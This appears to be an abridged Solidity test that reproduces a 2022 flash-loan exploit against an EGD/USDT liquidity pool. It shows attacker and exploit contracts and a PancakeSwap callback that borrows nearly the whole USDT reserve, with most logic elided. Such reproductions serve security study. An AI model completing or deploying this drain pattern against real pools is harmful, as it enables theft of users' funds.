...
contract Attacker is Test {
    ...
    constructor() {
        ...
        cheat.warp(1659914146); // block.timestamp = 2022-08-07 23:15:46(UTC)
...
contract Exploit is Test{
	...
	function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        if(keccak256(data) == keccak256("0000")) {
            ...
            borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9999999925 / 10000000000;  // Attacker borrow 99.99999925% USDT of EGD_USDT_LPPool reserve
